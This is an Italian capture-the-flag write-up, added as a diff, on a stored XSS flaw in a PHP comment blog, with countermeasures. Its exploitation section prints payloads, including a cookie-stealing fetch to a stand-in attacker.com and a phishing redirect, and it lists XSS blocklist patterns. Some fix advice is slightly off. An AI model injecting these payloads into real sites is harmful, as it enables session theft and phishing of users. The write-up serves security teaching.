@@ -1,0 +1,356 @@
+=============================================================================
+WRITEUP - XSS Stored (Esercizio 1)
+=============================================================================
+
+Autore:         Canessa Matteo
+Difficoltà:     Easy
+Obiettivo:      Eseguire JavaScript arbitrario nel browser di altri utenti 
+                tramite commenti
+
+=============================================================================
+1. INFORMAZIONI TARGET
+=============================================================================
+
+Tecnologie:     PHP 8.2, Apache 2.4, Docker, Python 3.12
+Vulnerabilità:  XSS Stored (Cross-Site Scripting Stored)
+Flag:           SNH{X5S_st0r3d_AtTaCk_Det3cTeD_Tag_5cr1pt}
+
+=============================================================================
+2. DESCRIZIONE SCENARIO
+=============================================================================
+
+L'applicazione web target è un semplice blog che consente agli utenti di 
+pubblicare commenti sui post. Tuttavia, non implementa correttamente la 
+validazione e la sanitizzazione dei dati in ingresso, rendendola vulnerabile 
+a un attacco XSS Stored. L'obiettivo è inserire uno script malevolo 
+all'interno di un commento, che verrà eseguito ogni volta che un utente 
+visualizza il post contenente quel commento.
+
+=============================================================================
+3. RECONNAISSANCE
+=============================================================================
+
+3.1 Analisi dell'Applicazione
+------------------------------
+
+Accedendo al sito si osserva:
+
+- Pagina web con form per inserimento commenti
+- Form contiene due campi: "Name" e "Comment"
+- Campo Name ha validazione client-side (pattern HTML)
+- Campo Comment non ha alcuna restrizione visibile
+- Link "View Comments" per visualizzare tutti i commenti pubblicati
+- Commenti salvati persistono e vengono mostrati a tutti gli utenti
+
+3.2 Analisi del Codice Sorgente
+--------------------------------
+
+File: index.php (semplificato) 
+
+1. VALIDAZIONE INPUT:
+
+<?php
+$name = $_POST['name'];
+$comment = $_POST['comment'];
+
+if (!preg_match('/^[a-zA-Z0-9 ]+$/', $name)) {
+    header('Location: index.php?error=...');
+    exit;
+}
+// Nessuna validazione per $comment
+?>
+
+2. SALVATAGGIO COMMENTO:
+
+<?php
+$entry = "<p><strong>" . $name . ":</strong> " . $comment . "</p>";
+file_put_contents('comments.txt', $entry, FILE_APPEND);
+?>
+
+
+File: view.php (semplificato)  
+
+3. VISUALIZZAZIONE COMMENTI:
+
+<?php
+$comments = file_get_contents('comments.txt');
+echo $comments;  // Nessuna sanitizzazione
+?>
+
+
+Problemi identificati:
+- Campo "comment" non validato né sanitizzato
+- Commento salvato direttamente nel file con tag HTML
+- Commento mostrato con echo senza htmlspecialchars()
+- Qualsiasi codice HTML/JS inserito viene eseguito
+
+Protezioni implementate:
+- Validazione campo "name" (solo alfanumerici e spazi)
+
+
+=============================================================================
+4. ANALISI DELLA VULNERABILITÀ
+=============================================================================
+
+Tipo:            XSS Stored (Cross-Site Scripting Stored)
+Severity:        CRITICAL
+Impatto:         Esecuzione di script malevoli su tutti gli utenti
+
+Descrizione tecnica:
+L'applicazione non sanitizza il campo "comment" prima di salvarlo nel file
+comments.txt. Quando un utente visualizza la pagina dei commenti, il contenuto
+viene letto dal file e stampato direttamente con echo, senza encoding HTML.
+
+Se un attaccante inserisce codice JavaScript (es. tag <script>), questo viene:
+1. Salvato nel file comments.txt con i tag <script> intatti
+2. Mostrato nella pagina view.php senza sanitizzazione
+3. Interpretato dal browser come codice JavaScript legittimo
+4. Eseguito automaticamente ogni volta che qualcuno carica la pagina
+
+
+Catena di attacco:
+1. Attaccante inserisce commento con codice JavaScript malevolo
+2. Commento viene salvato in comments.txt senza sanitizzazione
+3. Qualsiasi utente che visita view.php carica il commento malevolo
+4. Browser interpreta il tag <script> ed esegue il codice JavaScript
+5. Attaccante può:
+   - Rubare cookie di sessione (document.cookie)
+   - Modificare il contenuto della pagina
+   - Reindirizzare a siti phishing
+   - Eseguire azioni a nome dell'utente
+
+=============================================================================
+5. EXPLOITATION
+=============================================================================
+
+5.1 STEP 1: Creazione del Payload Malevolo
+-------------------------------------------
+
+Per sfruttare la vulnerabilità, creiamo un commento contenente un tag <script>
+con codice JavaScript. 
+
+Payload base:
+┌─────────────────────────────────────────────────────────────┐
+│ <script>alert('XSS Stored Attack Detected!');</script>      │
+└─────────────────────────────────────────────────────────────┘
+
+
+Payload alternativi per attacco reale:
+
+Furto cookie di sessione:
+┌─────────────────────────────────────────────────────────────┐
+│ <script>                                                    │
+│   fetch('http://attacker.com/steal?c=' + document.cookie);  │
+│ </script>                                                   │
+└─────────────────────────────────────────────────────────────┘
+
+Redirect:
+┌───────────────────────────────────────────────────────────────────┐
+│ <script>window.location='http://attacker.com/phishing';</script>  │
+└───────────────────────────────────────────────────────────────────┘
+
+5.2 STEP 2: Inserimento del Payload
+------------------------------------
+
+1. Accedere alla pagina principale del blog
+2. Compilare il form di inserimento commento:
+
+   Name:    TestUser
+   Comment: <script>alert('XSS Stored Attack Detected!');</script>
+
+3. Cliccare sul pulsante "Submit"
+4. Il sistema reindirizza automaticamente a view.php
+
+Processo interno:
+- POST viene inviato a index.php
+- Campo "name" passa la validazione (contiene solo lettere)
+- Campo "comment" NON viene validato
+- Contenuto salvato in comments.txt:
+
+  <p><strong>TestUser:</strong> <script>alert('XSS Stored Attack Detected!');</script></p>
+
+- Tag <script> salvato integralmente nel file
+
+
+5.3 STEP 3: Esecuzione dello Script
+------------------------------------
+
+Quando un utente (vittima) carica la pagina view.php:
+
+1. PHP legge il contenuto di comments.txt
+2. PHP esegue: echo $comments (senza sanitizzazione)
+3. HTML generato contiene il tag <script> malevolo
+4. Browser della vittima riceve l'HTML:
+
+   <html>
+   <body>
+     <h1>Comments List</h1>
+     <p><strong>TestUser:</strong> <script>alert('XSS');</script></p>
+   </body>
+   </html>
+
+5. Browser interpreta il tag <script> come codice legittimo
+6. JavaScript viene eseguito immediatamente
+7. Popup alert appare sullo schermo della vittima
+
+Questo accade per ogni utente che visita view.php, non solo una volta.
+Il payload è "stored" e persiste fino alla rimozione manuale.
+
+5.4 STEP 4: Rilevamento Attacco e Flag
+---------------------------------------
+
+L'applicazione implementa un meccanismo di rilevamento XSS tramite script Python
+che scansiona automaticamente i commenti alla ricerca di tag pericolosi.
+
+Meccanismo di rilevamento (view.php):
+
+1. Output buffering cattura l'HTML renderizzato della pagina
+   <?php ob_start(); ?>
+
+2. Pagina viene generata con i commenti (incluso il payload XSS)
+
+3. Contenuto HTML completo viene salvato in file temporaneo
+   <?php
+   $html_page = ob_get_contents();
+   file_put_contents('view_rendered.html', $html_page);
+   ?>
+
+4. Script Python viene eseguito per analizzare l'HTML salvato
+   <?php system("python3 check_attack.py view_rendered.html"); ?>
+
+
+Script Python (check_attack.py - semplificato):
+
+import re
+from bs4 import BeautifulSoup
+
+# Legge l'HTML renderizzato
+with open(file_path, 'r') as file:
+    content = file.read()
+    soup = BeautifulSoup(content, 'html.parser')
+
+    # Cerca tag <script>
+    if soup.find_all('script'):
+        print(os.getenv("FLAG"))  # Stampa la flag se trova XSS
+
+
+Quando un tag <script> viene rilevato, lo script Python stampa la flag:
+
+┌─────────────────────────────────────────────────────────────┐
+│ SNH{X5S_st0r3d_AtTaCk_Det3cTeD_Tag_5cr1pt}                  │
+└─────────────────────────────────────────────────────────────┘
+
+La flag appare nell'output della pagina sotto i commenti, confermando
+che l'attacco XSS Stored è stato eseguito con successo.
+
+=============================================================================
+6. CONTROMISURE
+=============================================================================
+
+6.1 CORREZIONE CRITICA: Output Encoding con htmlspecialchars()
+---------------------------------------------------------------
+
+La vulnerabilità principale è l'assenza di sanitizzazione durante l'output.
+Il contenuto dei commenti viene stampato direttamente nella pagina HTML senza
+alcun encoding, permettendo l'esecuzione di script malevoli.
+
+CODICE VULNERABILE (estratto da view.php):
+┌─────────────────────────────────────────────────────────────┐
+│ <?php                                                       │
+│ $comments = file_get_contents('comments.txt');              │
+│ echo $comments;  // PERICOLOSO                              │
+│ ?>                                                          │
+└─────────────────────────────────────────────────────────────┘
+
+CODICE CORRETTO:
+┌─────────────────────────────────────────────────────────────┐
+│ <?php                                                       │
+│ $comments = file_get_contents('comments.txt');              │
+│ echo htmlspecialchars($comments, ENT_QUOTES, 'UTF-8');      │
+│ ?>                                                          │
+└─────────────────────────────────────────────────────────────┘
+
+Spiegazione:
+- htmlspecialchars(): converte caratteri speciali in entità HTML
+- ENT_QUOTES: converte sia apici singoli che doppi
+- 'UTF-8': specifica l'encoding per gestire correttamente i caratteri speciali
+
+
+
+6.2 Sanitizzazione dell'Input
+------------------------------
+
+Sanitizzare i commenti prima di salvarli per rimuovere tag HTML e JavaScript:
+
+<?php
+$comment = $_POST['comment'];
+
+// Rimuove tutti i tag HTML e PHP
+$comment = strip_tags($comment);
+
+// Oppure permetti solo tag sicuri (grassetto, corsivo)
+$comment = strip_tags($comment, '<b><i><em><strong>');
+
+// Salva il commento sanitizzato
+$entry = "<p><strong>" . htmlspecialchars($name) . ":</strong> "
+       . htmlspecialchars($comment) . "</p>";
+?>
+
+
+6.3 Validazione Lato Server
+----------------------------
+
+Implementare una blacklist di pattern pericolosi per bloccare tentativi
+di XSS prima del salvataggio:
+
+<?php
+$dangerousPatterns = [
+    '/<script\b[^>]*>(.*?)<\/script>/is',
+    '/javascript:/i',
+    '/on\w+\s*=/i',  // onclick, onerror, onload, etc.
+    '/<iframe\b[^>]*>/i',
+    '/<object\b[^>]*>/i',
+    '/<embed\b[^>]*>/i'
+];
+
+foreach ($dangerousPatterns as $pattern) {
+    if (preg_match($pattern, $comment)) {
+        header('Location: index.php?error=...');
+        exit;
+    }
+}
+?>
+
+Limitazioni: Le blacklist possono essere bypassate con tecniche di obfuscation.
+
+
+6.4 Content Security Policy (CSP)
+----------------------------------
+
+Implementare CSP header per limitare le fonti di script eseguibili:
+
+File: .htaccess
+┌─────────────────────────────────────────────────────────────┐
+│ Header set Content-Security-Policy "default-src 'self'; \   │
+│ script-src 'self'; style-src 'self' 'unsafe-inline'; \      │
+│ object-src 'none'; base-uri 'self';"                        │
+└─────────────────────────────────────────────────────────────┘
+
+Spiegazione:
+- default-src 'self': Permette solo risorse dallo stesso dominio
+- script-src 'self': Permette solo script dallo stesso dominio
+- style-src 'self' 'unsafe-inline': Permette stili dallo stesso dominio e inline styles (se necessario)
+- object-src 'none': Blocca qualsiasi oggetto
+- base-uri 'self': Limita la base URI per prevenire attacchi di clickjacking (click su elementi nascosti)
+
+Oppure in PHP:
+<?php
+header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';");
+?>
+
+Benefici:
+- Blocca l'esecuzione di script inline (compresi quelli iniettati via XSS)
+- Permette solo script provenienti dallo stesso dominio
+- Previene caricamento di risorse esterne malevole
+
+Nota: Richiede refactoring del codice per rimuovere inline scripts legittimi.
